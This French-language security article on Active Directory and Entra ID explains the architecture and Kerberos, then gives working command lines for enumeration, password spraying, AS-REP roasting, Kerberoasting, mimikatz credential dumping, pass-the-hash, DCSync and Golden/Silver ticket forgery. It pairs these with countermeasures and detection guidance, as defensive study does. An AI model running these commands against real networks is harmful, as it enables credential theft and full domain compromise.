---
title: "Active Directory Security"
domain: "Applied Sciences"
subdomain: "Computer Science > Security"
tags: [sciences-appliquées, informatique, sécurité]
date: "2026-02-25"
---

# Active Directory Security

Active Directory (AD) est le service d'annuaire de Microsoft qui centralise l'authentification et l'autorisation dans les environnements Windows. Sa compromission équivaut à la compromission totale du domaine. C'est pourquoi AD est la cible privilégiée des attaquants dans les intrusions d'entreprise.

## Architecture AD — rappels essentiels

```
   Forest (forêt)
   ────────────────────────────────────────────────────────
                          │
            ┌─────────────┼─────────────┐
            ▼             ▼             ▼
       Domain A      Domain B      Domain C
       (parent)      (child)       (peer via Trust)
            │
            │ Trust = relation de confiance entre domaines
            │ (Forest Trust, External Trust, Parent-Child...)
            │
   ┌────────┴──────────────────────────────────────┐
   │ Domain : contoso.local                        │
   │                                               │
   │   ┌─────────────────────┐                     │
   │   │ Domain Controllers  │ ◄── KDC, LDAP, DNS, │
   │   │ (DC01, DC02...)     │     SMB, réplication│
   │   │ stockent NTDS.dit   │                     │
   │   └─────────────────────┘                     │
   │                                               │
   │   ┌─────────────────────┐    ┌──────────────┐ │
   │   │ OU = Organizational │ ◄──┤ GPO          │ │
   │   │ Units (conteneurs)  │    │ (Group Policy│ │
   │   │                     │    │  Objects)    │ │
   │   │  - OU=Finance       │    │              │ │
   │   │  - OU=IT            │    │ → appliquées │ │
   │   │  - OU=Servers       │    │   par OU     │ │
   │   └─────────────────────┘    └──────────────┘ │
   │              │                                │
   │              │ contient                       │
   │              ▼                                │
   │   ┌─────────────────────┐                     │
   │   │ Objets AD :         │                     │
   │   │  - Users            │                     │
   │   │  - Computers        │                     │
   │   │  - Groups           │                     │
   │   │  - Service Accounts │                     │
   │   └─────────────────────┘                     │
   │                                               │
   │   ┌─────────────────────┐                     │
   │   │ SYSVOL (partage SMB)│ ◄── scripts, GPO,   │
   │   │ \\dc\SYSVOL\        │     parfois         │
   │   └─────────────────────┘     credentials     │
   └───────────────────────────────────────────────┘
```

**À retenir** : les **GPO** sont liées aux **OU**, qui contiennent les **objets**. Compromettre la modification d'une GPO appliquée à l'OU des serveurs = exécution sur tous les serveurs. Compromettre un **Trust** = pivot vers un autre domaine.

Composants clés pour la sécurité :
- **NTDS.dit** : base de données AD (hashes des mots de passe, stockée sur les DCs)
- **SYSVOL** : partage réseau avec les GPO et scripts de démarrage
- **Kerberos** : protocole d'authentification par défaut (port 88)
- **LDAP** : protocole d'interrogation de l'annuaire (389/636)
- **SMB** : partage de fichiers (445)

## Authentification Kerberos

```
1. Client → KDC (AS-REQ) : demande un TGT en envoyant le hash NTLM
2. KDC → Client (AS-REP) : TGT chiffré avec le hash du compte krbtgt
3. Client → KDC (TGS-REQ) : présente le TGT pour demander un Service Ticket
4. KDC → Client (TGS-REP) : Service Ticket chiffré avec le hash du compte de service
5. Client → Service (AP-REQ) : présente le Service Ticket
```

## Reconnaissance et énumération

### LDAP Enumeration

```bash
# Lister les utilisateurs sans authentification (si AllowAnonymous)
ldapsearch -x -H ldap://dc.contoso.local -b "DC=contoso,DC=local" "(objectClass=user)"

# Avec credentials
ldapsearch -x -H ldap://dc.contoso.local \
    -D "CN=user,CN=Users,DC=contoso,DC=local" \
    -w "Password123" \
    -b "DC=contoso,DC=local" \
    "(objectClass=user)" sAMAccountName memberOf

# PowerView (PowerShell)
Get-NetUser | Select-Object samaccountname, description, memberof
Get-NetGroup -GroupName "Domain Admins" | Select-Object -ExpandProperty member
Get-NetComputer | Select-Object name, operatingsystem
Get-NetGPO | Select-Object displayname, gpcfilesyspath
```

### BloodHound — cartographie des chemins d'attaque

BloodHound collecte les relations AD et identifie les chemins vers Domain Admin.

```bash
# Collecte avec SharpHound (C#)
.\SharpHound.exe -c All --outputdirectory C:\Temp

# Ou via BloodHound.py (Linux)
bloodhound-python -u utilisateur -p Motdepasse -d contoso.local \
    -ns 192.168.1.10 -c All

# Requêtes BloodHound utiles (Cypher)
# Tous les chemins vers Domain Admin
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CONTOSO.LOCAL"}))
RETURN p

# Utilisateurs avec droits DCSync
MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u.name

# Comptes Kerberoastables
MATCH (u:User) WHERE u.hasspn=true AND u.enabled=true RETURN u.name, u.serviceprincipalnames
```

## Attaques de mots de passe

### Password Spraying

Tester un petit nombre de mots de passe courants contre tous les comptes (évite le lockout).

```bash
# Crackmapexec
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Password123" --continue-on-success

# Kerbrute (via Kerberos — plus discret que LDAP)
kerbrute passwordspray -d contoso.local --dc 192.168.1.10 users.txt "Contoso2024!"
```

### AS-REP Roasting

Les comptes avec l'option "Do not require Kerberos preauthentication" permettent d'obtenir un AS-REP chiffré avec leur hash, sans s'authentifier.

```bash
# Identifier les comptes vulnérables
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Récupérer les AS-REP
impacket-GetNPUsers contoso.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10

# Cracker le hash offline
hashcat -m 18200 asrep_hashes.txt wordlist.txt --rules-file best64.rule
```

### Kerberoasting

Demander des Service Tickets pour des comptes de service (SPNs) et les cracker offline.

```bash
# Lister les SPNs
impacket-GetUserSPNs contoso.local/utilisateur:Motdepasse -dc-ip 192.168.1.10

# Récupérer les TGS
impacket-GetUserSPNs contoso.local/utilisateur:Motdepasse \
    -dc-ip 192.168.1.10 -request -outputfile tgs_hashes.txt

# Cracker
hashcat -m 13100 tgs_hashes.txt wordlist.txt
```

## Attaques sur les hashes NTLM

### Pass-the-Hash (PtH)

Utiliser le hash NTLM directement sans connaître le mot de passe en clair.

```bash
# Extraire les hashes locaux (LSASS ou SAM)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords   → hashes des sessions actives
mimikatz # lsadump::sam               → hashes SAM (comptes locaux)

# Utiliser le hash pour s'authentifier
crackmapexec smb 192.168.1.0/24 -u Administrateur -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrateur@192.168.1.50
```

### Pass-the-Ticket (PtT)

Utiliser un ticket Kerberos volé (TGT ou TGS).

```bash
# Exporter les tickets depuis la mémoire
mimikatz # sekurlsa::tickets /export

# Injecter un ticket dans la session courante
mimikatz # kerberos::ptt ticket.kirbi

# Vérifier l'injection
klist
```

## Attaques de domaine

### DCSync

Simuler le comportement d'un DC pour répliquer les hashes de tous les comptes (dont krbtgt).

```bash
# Requiert : DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
mimikatz # lsadump::dcsync /domain:contoso.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:contoso.local /all /csv

# Depuis Linux avec impacket
impacket-secretsdump contoso.local/utilisateur:Motdepasse@192.168.1.10 -just-dc
```

### Golden Ticket

Forger un TGT valide en utilisant le hash NTLM du compte **krbtgt**.

```bash
# Récupérer le hash krbtgt via DCSync
mimikatz # lsadump::dcsync /domain:contoso.local /user:krbtgt

# Forger le Golden Ticket
mimikatz # kerberos::golden \
    /domain:contoso.local \
    /sid:S-1-5-21-XXXXXXXXXX \
    /krbtgt:HASH_KRBTGT \
    /user:Administrateur \
    /groups:512 \         # Domain Admins
    /ticket:golden.kirbi

# Injecter et accéder à n'importe quelle ressource
mimikatz # kerberos::ptt golden.kirbi
dir \\dc.contoso.local\C$
```

Un Golden Ticket reste valide 10 ans par défaut et survit aux changements de mot de passe des utilisateurs (sauf si le hash krbtgt est réinitialisé deux fois de suite).

### Silver Ticket

Forger un Service Ticket pour un service spécifique en utilisant le hash du compte de service.

```bash
mimikatz # kerberos::golden \
    /domain:contoso.local \
    /sid:S-1-5-21-XXXXXXXXXX \
    /target:serveur.contoso.local \
    /service:cifs \
    /rc4:HASH_COMPTE_SERVICE \
    /user:Administrateur \
    /ticket:silver.kirbi
```

### ACL Abuse

Les ACLs AD peuvent conférer des droits dangereux à des comptes non privilégiés.

| Droit ACL | Abus possible |
|---|---|
| `GenericAll` | Modifier le mot de passe, ajouter des membres, DCSync |
| `WriteDACL` | Ajouter ses propres droits |
| `WriteOwner` | Prendre possession, puis ajouter droits |
| `ForceChangePassword` | Changer le mot de passe sans connaître l'actuel |
| `GenericWrite` | Modifier les attributs (dont SPN → Kerberoasting ciblé) |
| `AllExtendedRights` | Inclut DCSync, ForceChangePassword |

```bash
# BloodHound identifie ces chemins automatiquement
# PowerView pour vérifier manuellement
Get-ObjectAcl -SamAccountName "utilisateur_cible" -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"}
```

## Défenses

### Tier Model (Microsoft)

Segmentation stricte des accès administratifs :

```
Tier 0 : Domain Controllers, AD
         → Accès uniquement depuis des PAW (Privileged Access Workstations) Tier 0

Tier 1 : Serveurs d'application, infrastructure
         → Admins Tier 1 ne touchent jamais Tier 0

Tier 2 : Postes de travail, utilisateurs
         → Admins Tier 2 ne touchent jamais Tier 1 ou 0
```

### Contre-mesures par attaque

| Attaque | Contre-mesure |
|---|---|
| Password Spraying | Politique de lockout + alertes sur 4625 répétés |
| AS-REP Roasting | Activer la pré-authentification (désactiver `DoesNotRequirePreAuth`) |
| Kerberoasting | Mots de passe longs (>25 chars) pour les comptes de service, managed service accounts |
| Pass-the-Hash | Credential Guard, LAPS, désactiver NTLM |
| DCSync | Auditer DS-Replication-Get-Changes, alertes sur les réplications inattendues |
| Golden/Silver Ticket | Réinitialiser krbtgt 2x, Kerberos armoring (FAST), Microsoft Defender for Identity |
| BloodHound | Auditer et nettoyer les ACLs, réduire les droits excessifs |

### Outils défensifs

```bash
# Microsoft Defender for Identity (anciennement ATA)
# — détecte les comportements anormaux Kerberos, PtH, DCSync

# PingCastle — audit de la sécurité AD
PingCastle.exe --healthcheck --server dc.contoso.local

# Purple Knight (Semperis) — audit des vulnérabilités AD

# LAPS (Local Administrator Password Solution)
# — mots de passe administrateurs locaux uniques et rotatifs par machine

# Protected Users Security Group
# — désactive NTLM, force Kerberos, empêche la délégation
Add-ADGroupMember -Identity "Protected Users" -Members compte_sensible
```

## Azure AD / Entra ID — Attaques modernes

Azure Active Directory (rebaptisé Microsoft Entra ID en 2023) est le système d'identité cloud de Microsoft. Il présente des vecteurs d'attaque spécifiques différents de l'AD on-premise.

### MFA Fatigue (Prompt Bombing)

Lorsqu'un attaquant a volé le mot de passe, il déclenche des dizaines de notifications MFA (push) jusqu'à ce que l'utilisateur en accepte une par fatigue ou erreur.

```
Attaque :
1. Credential stuffing / phishing → mot de passe obtenu
2. Tentatives de connexion répétées → l'utilisateur reçoit 20-50 notifications push
3. Parfois accompagné d'un appel téléphonique ("IT ici, confirmez votre push")
4. L'utilisateur approuve → compromission

Victimes notables : Uber (2022), Microsoft (2022), Okta (2022)

Contre-mesures :
- Passer aux méthodes MFA sans notification push (FIDO2/passkeys, TOTP)
- Activer "Number Matching" (l'utilisateur doit taper le code affiché)
- Activer "Additional Context" (localisation, application dans la notification)
- Limiter les tentatives d'auth (smart lockout)
```

```powershell
# Activer Number Matching dans Microsoft Authenticator
# Microsoft Entra ID → Protection → Méthodes d'authentification
# → Microsoft Authenticator → Paramètres → Number Matching : Activé

# Conditional Access — forcer FIDO2 pour les admins
New-MgIdentityConditionalAccessPolicy -BodyParameter @{
    displayName = "Require FIDO2 for admins"
    state = "enabled"
    conditions = @{
        users = @{ includeRoles = @("62e90394-69f5-4237-9190-012177145e10") }
    }
    grantControls = @{
        operator = "AND"
        authenticationStrength = @{ id = "fido2-strength-policy-id" }
    }
}
```

### Token Theft et Replay

Vol de tokens d'authentification (cookies de session, access tokens, refresh tokens) pour contourner l'authentification sans mot de passe ni MFA.

```
Techniques :
- Adversary-in-the-Middle (AiTM) : Evilginx2, Muraena
  Proxy transparent entre l'utilisateur et le vrai service
  → Capture session cookies même après MFA

- Malware sur l'appareil : vol du token depuis le navigateur
  (fichiers SQLite de Chrome/Edge sur Windows)

- Pass-the-Cookie :
  Importer les cookies volés dans un navigateur attaquant
  → Session authentifiée sans MFA
```

```bash
# Evilginx2 — exemple éducatif de phishlet
# Capture les credentials ET les cookies de session

# Détection dans Azure AD Logs
# "Sign-in location" différente du cookie de session d'origine
# "Session" réutilisée depuis une IP inconnue

# Contre-mesure : Continuous Access Evaluation (CAE)
# → Token invalidé immédiatement si l'IP change, l'appareil révoqué, etc.
# → Réduit la fenêtre d'exploitation d'un token volé de heures à secondes
```

### Device Code Flow Abuse

Détournement du flux OAuth Device Code pour du phishing sans landing page.

```
Flux légitime (TV, IoT) :
1. Appareil affiche un code (ex: ABC-123) et une URL
2. L'utilisateur va sur l'URL depuis son téléphone
3. Entre le code et s'authentifie
4. L'appareil reçoit le token

Abus :
1. Attaquant initie un Device Code Flow
2. Envoie le lien par email à la cible ("Validez votre accès Teams")
3. Cible s'authentifie normalement sur microsoft.com (légitime)
4. Attaquant reçoit un refresh token valide → accès long terme

# Détection : connexions Device Code Flow depuis des IPs inattendues
# Contre-mesure : bloquer Device Code Flow par Conditional Access
```

### Conditional Access — Contournements

Les politiques Conditional Access peuvent avoir des angles morts :

```
Angles morts courants :
- Applications legacy non couvertes (Basic Auth désactivé ? vérifier)
- Service principals exemptés par erreur
- Politiques en mode "Report-only" (observent sans bloquer)
- Break-glass accounts sans CA (nécessaires mais à surveiller)

# Vérifier l'état des politiques
Get-MgIdentityConditionalAccessPolicy | Select DisplayName, State
# "enabledForReportingButNotEnforced" = audit seulement

# Applications utilisant l'authentification Basic (legacy)
Get-MgAuditLogSignIn -Filter "clientAppUsed eq 'IMAP4'" -Top 50
```

### Énumération Azure AD sans authentification

```bash
# Énumérer les domaines associés à un tenant (public)
curl "https://login.microsoftonline.com/monentreprise.com/.well-known/openid-configuration"
# → Révèle le tenant ID, endpoints, etc.

# Vérifier si un email existe dans Azure AD (UserEnumeration)
# Endpoint legacy : différence de réponse selon email valide/invalide
# Corrigé avec SSPR mais encore exploitable sur certains tenants

# AADInternals — reconnaissance Azure AD
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName "cible.com"
# Révèle : tenant ID, région, SKU, services activés
```

### Persistance dans Azure AD

```powershell
# Backdoor via Application Registration
# → Créer une app avec des credentials supplémentaires
# → Même si l'admin change son mot de passe, l'app conserve son accès

# Détecter les apps avec beaucoup de permissions
Get-MgServicePrincipal -All | ForEach-Object {
    $sp = $_
    $perms = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id
    if ($perms.Count -gt 5) {
        "$($sp.DisplayName) : $($perms.Count) permissions"
    }
}

# Alertes à configurer :
# - Nouvelle app enregistrée avec permissions élevées
# - Credentials ajoutés à une app existante (secret ou certificat)
# - Rôle Global Admin accordé
# - Guest invitation depuis un domaine non autorisé
```

## Pièges courants

- **Compter sur les groupes pour mesurer l'exposition** : un user qui n'est pas dans "Domain Admins" peut quand même y arriver via une chaîne d'ACL de 4-5 étapes. BloodHound révèle ces chemins, pas un audit manuel.
- **NTDS.dit récupérable hors-ligne via VSS** : un attaquant avec accès admin local sur un DC peut faire une shadow copy (`vssadmin create shadow`) et copier NTDS.dit sans déclencher les alertes "dump LSASS". À monitorer en plus.
- **Comptes de service avec mots de passe humains** : si `svc_sql` a un mot de passe défini par un humain au lieu d'être un MSA/gMSA, il est Kerberoastable et son hash craque vite. Migration gMSA = quick win.
- **Mots de passe en clair dans SYSVOL (legacy GPP)** : les Group Policy Preferences chiffraient avec une clé publique → déchiffrement trivial. Patché en 2014 mais SYSVOL historique peut encore contenir des `groups.xml`.
- **Pré-authentification Kerberos désactivée par défaut sur des comptes legacy** : ces comptes sont AS-REP roastable. À identifier (`Get-DomainUser -PreauthNotRequired`) et activer.
- **Tier model jamais implémenté** : si les Domain Admins se loguent sur des postes utilisateurs (Tier 2), leurs credentials se retrouvent en mémoire → Mimikatz suffit. Tier 0 = DCs, Tier 1 = serveurs, Tier 2 = postes, jamais croiser.
- **LAPS pas activé** : sans LAPS, un mot de passe admin local identique sur 500 machines = compromettre une = compromettre toutes (pass-the-hash en chaîne). Activation LAPS = un des plus gros gains de sécurité AD.
- **Trust avec SID History** : un trust mal configuré (sans SID Filtering) permet d'injecter un SID Domain Admin du domaine cible dans un TGT du domaine source. Vérifier `netdom trust /quarantine`.
- **MachineAccountQuota = 10 par défaut** : tout user du domaine peut créer 10 comptes machine. Ouvre la porte à RBCD. Mettre à 0 si pas de besoin métier.
- **Azure AD Connect = compte synchronisé surprivilégié** : le compte de sync a souvent des droits DCSync implicites. Cible n°1 pour passer du on-prem au cloud.
